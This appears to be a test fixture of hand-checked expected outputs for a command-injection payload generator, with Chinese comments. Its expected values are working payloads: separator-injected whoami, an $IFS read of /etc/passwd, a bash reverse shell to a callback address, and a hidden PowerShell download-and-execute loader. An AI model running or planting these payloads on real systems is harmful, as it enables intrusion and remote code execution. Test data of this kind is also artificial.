@@ -1,0 +1,206 @@
+# 命令注入黄金样本（§13.2）
+# 期望值同样手写核算，不由工具反向生成。
+# 注意 `--vuln rce` 时要带 content-type，否则默认的 sql-expression 会把模板全过滤掉。
+
+ruleDB: v0.1.0
+
+samples:
+  # ---------- 默认变量 ----------
+
+  - name: 裸命令走 VAR_DEFAULTS 的 cmd 默认值
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.cmd.raw
+      outputs: [raw]
+    expect:
+      payload: whoami
+
+  # ---------- 槽位 ----------
+
+  - name: 分号分隔 + 默认命令
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      outputs: [raw]
+    expect:
+      payload: ";whoami"
+
+  - name: 自定义分隔符与命令
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      slots: {sep: "&&"}
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "&&id"
+
+  - name: $IFS 绕过空格
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.space.ifs
+      outputs: [raw]
+    expect:
+      payload: ";cat$IFS/etc/passwd"
+
+  # ---------- 命令替换 ----------
+
+  - name: $() 命令替换
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.subst.dollar
+      outputs: [raw]
+    expect:
+      payload: "$(whoami)"
+
+  - name: 反引号命令替换
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.subst.backtick
+      outputs: [raw]
+    expect:
+      payload: "`whoami`"
+
+  # ---------- join 绕过（此前无样本覆盖）----------
+
+  - name: join 绕过把字面片段与 payload 连起来
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.cmd.raw
+      bypasses: [bypass.join.semicolon]
+      outputs: [raw]
+    expect:
+      payload: "id;whoami"
+
+  # ---------- 回调地址无默认值（有意为之，见 §9）----------
+
+  - name: 回调地址未填时保持字面量
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.bash
+      outputs: [raw]
+    expect:
+      payload: ";bash -i >& /dev/tcp/<<lhost>>/<<lport>> 0>&1"
+
+  - name: 填了回调地址
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.bash
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+
+  # ---------- 输出层 ----------
+
+  - name: curl 输出（命令注入放进 URL 参数）
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      submit: query
+      host: example.com
+      path: /
+      param: id
+      method: GET
+      shell: bash
+      outputs: [curl]
+    expect:
+      outputs:
+        curl: "curl 'http://example.com/?id=%3Bwhoami'"
+
+  # ---------- 重复编码提示（§8.2 新增）----------
+
+  - name: rce.linux.sep.basic · 绕过层已 URL 编码、传输层再编一次 → 提示但不拦截
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      bypasses: [bypass.url]
+      submit: query
+      outputs: [raw]
+    expect:
+      payload: "%3Bwhoami"
+      checks_count: 1
+
+  - name: 提交方式不做 URL 编码时不提示
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      bypasses: [bypass.url]
+      submit: header
+      header: X-Test
+      outputs: [raw]
+    expect:
+      payload: "%3Bwhoami"
+      checks_count: 0
+
+  # ---------- 跨类型套用绕过 ----------
+
+  - name: 把 SQL 专用绕过套到 shell 上 → 提示但不拦截
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.basic
+      bypasses: [bypass.space.comment]
+      outputs: [raw]
+    expect:
+      payload: ";whoami"
+      # 两条提示：①跨类型套用绕过的提醒 ②`;whoami` 里没有空格，
+      # 「注释替代空格」什么都没改，所以「没有改变载荷」也报了出来
+      checks_count: 2
+
+  # ---------- 不加 --content-type 也应能出结果（默认不过滤）----------
+
+  - name: 只给 vuln 不给 content_type
+    state:
+      vuln: rce
+      template: rce.linux.sep.basic
+      outputs: [raw]
+    expect:
+      payload: ";whoami"
+
+  # ---------- skip_quoted ----------
+
+  - name: skip_quoted 保护 PowerShell 字符串字面量里的空格
+    state:
+      vuln: rce
+      content_type: powershell-command
+      template: rce.windows.powershell.iex
+      vars: {lhost: "10.0.0.1", file: "a.ps1"}
+      bypasses: [bypass.space.plus]
+      outputs: [raw]
+    expect:
+      # 双引号里的 .NET 类型名不能被空格替换波及，否则 New-Object+Net.WebClient 直接失效
+      payload: "&powershell+-nop+-w+hidden+-c+\"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')\""
+
+  # ---------- Windows ----------
+
+  - name: Windows 命令分隔
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.sep.basic
+      outputs: [raw]
+    expect:
+      payload: "&whoami"
+
+  - name: PowerShell 内存加载
+    state:
+      vuln: rce
+      content_type: powershell-command
+      template: rce.windows.powershell.iex
+      vars: {lhost: "10.0.0.1", file: "a.ps1"}
+      outputs: [raw]
+    expect:
+      payload: "&powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')\""
